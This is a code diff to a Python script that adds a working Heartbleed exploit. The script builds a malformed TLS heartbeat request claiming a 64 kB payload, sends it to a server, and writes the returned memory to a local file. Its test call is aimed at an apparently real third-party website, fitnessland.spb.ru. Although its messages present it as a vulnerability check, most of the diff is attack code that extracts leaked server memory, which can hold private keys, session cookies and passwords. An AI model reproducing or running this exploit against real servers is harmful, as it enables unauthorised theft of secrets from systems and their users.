@@ -1,7 +1,7 @@
 __author__ = 'Den'
 
 import socket
-import sys
+import os
 import binascii
 import time
 import select
@@ -27,6 +27,12 @@ helloPacket = hex2bin(
 '01'                # Compression methods length
 '00'                # Compression method 0: no compression = 0
 '00 00'             # Extensions length = 0
+)
+
+heartbleedPacket = hex2bin(
+'18 03 02 00 03'    # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
+'01 FF FF'          # Heartbeat message type = 01 (request); Payload length = FF FF
+                    # Missing a message that is supposed to be FF FF bytes long
 )
 
 def recvall(s, length, timeout=5):
@@ -75,8 +81,38 @@ def getTLSMessage(s, fragments=1):
 
     return contentType, version, payload
 
-def check(url, port=443):
-    host = urllib.parse.urlparse(url).netloc
+def dump(s):
+    filename = "hb_dump.txt"
+    dump = open(filename,'wb')
+    dump.write(s)
+    dump.close()
+    print("Saved into "+os.path.abspath(filename))
+
+def exploit(s):
+    s.send(heartbleedPacket)
+
+    # We asked for 64 kB, so we should get 4 packets
+    contentType, version, payload = getTLSMessage(s, 4)
+    if contentType is None:
+        print('No heartbeat response received, server likely not vulnerable')
+        return False
+
+    if contentType == 24:
+        print('Received heartbeat response:')
+        dump(payload)
+        if len(payload) > 3:
+            print('WARNING: server returned more data than it should - server is vulnerable!')
+        else:
+            print('Server processed malformed heartbeat, but did not return any extra data.')
+        return True
+
+    if contentType == 21:
+        print('Received alert:')
+        dump(payload)
+        print('Server returned error, likely not vulnerable')
+        return False
+
+def check(host, port=443):
     print("Start scan: {0} at port {1}".format(host, port))
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -100,9 +136,12 @@ def check(url, port=443):
             break
 
     print('Sending heartbeat request...')
+    exploit(s)
 
 def main(): #for test
-	check("fitnessland.spb.ru")
+    url = "https://fitnessland.spb.ru"
+    host = urllib.parse.urlparse(url).netloc
+    check(host)
 
 if __name__ == '__main__':
-	main()
+    main()
